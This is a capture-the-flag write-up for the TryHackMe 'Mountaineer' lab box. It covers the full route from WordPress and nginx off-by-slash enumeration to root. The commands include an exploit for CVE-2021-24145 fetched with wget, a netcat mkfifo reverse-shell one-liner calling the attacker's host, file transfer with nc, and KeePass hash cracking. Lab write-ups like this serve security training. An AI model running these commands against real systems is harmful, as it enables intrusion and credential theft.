# TryHackMe: Mountaineer
![room_image](https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718377695513)
---

Mountaineer was an interesting box that started with discovering a WordPress instance running a plugin vulnerable to authenticated RCE. Using the nginx off-by-slash vulnerability, I was able to read files on the server, which revealed a vhost hosting Roundcube. By logging into Roundcube with guessable credentials, I found WordPress creds and some user info. Using the creds, I exploited the vulnerable plugin to get a shell as `www-data`.

Later, I found a KeePass database belonging to a user I had info on. By generating a targeted wordlist, I cracked the master password for the database, which gave me creds for another user. Checking their bash history revealed the `root` password, allowing me to complete the room.

Finally, I’ve also documented how the nginx off-by-slash vuln can be combined with WordPress password reset to gain a foothold.

---

## Room Link

[TryHackMe Mountaineer](https://tryhackme.com/room/mountaineerlinux)

---

## Initial Enumeration

### Nmap

```bash
nmap -T4 -n -sC -sV -Pn -p- 10.10.146.154
```

**Ports open:**

* 22 (SSH)
* 80 (HTTP)

Visiting `http://10.10.146.154` showed the default nginx page.

---

## Shell as www-data

### Enumerating WordPress

Using `ffuf`, I found `/wordpress/`:

```bash
ffuf -u 'http://10.10.146.154/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fs 162
```

Since resources loaded under `mountaineer.thm`, I added:

```
10.10.146.154 mountaineer.thm
```

to `/etc/hosts`.

---

### WPScan Enumeration

```bash
wpscan --url http://mountaineer.thm/wordpress/ -e ap,vt,tt,cb,dbe,u,m
```

**Users discovered:**

* admin
* everest
* montblanc
* chooyu
* k2

**Plugin discovered:**

* Modern Events Calendar Lite 5.16.2

**Vulnerabilities:**

* CVE-2021-24946 (unauth blind SQLi, not useful for creds)
* CVE-2021-24145 (auth RCE via arbitrary file upload)

---

## Nginx Off-By-Slash

Fuzzing `/wordpress/` revealed `/wordpress/images/`, which was exploitable via:

```
/wordpress/images../.
```

to read server files. Extracted:

* `adminroundcubemail.mountaineer.thm`

Added to hosts:

```
10.10.146.154 adminroundcubemail.mountaineer.thm
```

---

## Roundcube Access

Navigated to `http://adminroundcubemail.mountaineer.thm` and brute-forced weak creds. Logged in using:

```
k2:k2
```

* Found password in inbox
* Found `lhotse` user info in sent items

---

## Exploiting CVE-2021-24145

Logged into WordPress as `k2`, used:

```bash
wget https://raw.githubusercontent.com/Hacker5preme/Exploits/refs/heads/main/Wordpress/CVE-2021-24145/exploit.py
python3 exploit.py -T mountaineer.thm -P 80 -U /wordpress/ -u k2 -p <password>
```

Confirmed shell upload:

```
http://mountaineer.thm/wordpress/wp-content/uploads/shell.php
```

Got reverse shell as `www-data`:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <my-ip> 443 >/tmp/f
```

---

## Shell as kangchenjunga

### Finding KeePass Database

Found `Backup.kdbx` in `/home/lhotse/`, readable by `www-data`. Transferred via:

```bash
nc -lvnp 444 > Backup.kdbx
nc <my-ip> 444 < /home/lhotse/Backup.kdbx
```

---

### Cracking KeePass

Generated hash:

```bash
keepass2john Backup.kdbx > keepass_hash
```

Default lists failed, so generated targeted wordlist using `cupp`:

```bash
cupp -i
```

Cracked using:

```bash
john keepass_hash --wordlist=mount.txt
```

Recovered master password, opened in `kpcli`, retrieved `kangchenjunga` creds.

---

### SSH Access

```bash
ssh kangchenjunga@mountaineer.thm
```

Found first flag:

```
/home/kangchenjunga/local.txt
```

---

## Root Access

### Checking Bash History

Found note in `mynotes.txt` that root used this user’s account. `.bash_history` contained:

```
suroot
<root-password>
```

Switched to root:

```bash
su - root
```

Read final flag:

```
/root/root.txt
```

---

## Alternative Foothold: Password Reset + Off-By-Slash

1. Use **WordPress password reset** for `admin`.
2. Exploit nginx off-by-slash to read `/var/mail/www-data` and get the reset link.
3. Reset admin password.
4. Use CVE-2021-24145 or plugin upload to get `www-data` shell.

---

## Notes

✅ Demonstrated multiple foothold paths
✅ Practical off-by-slash exploitation and KeePass cracking
✅ Covered complete path to root

---

If you need, I can generate this as a **clean PDF for your TryHackMe collection** for easy review and print-friendly offline study.
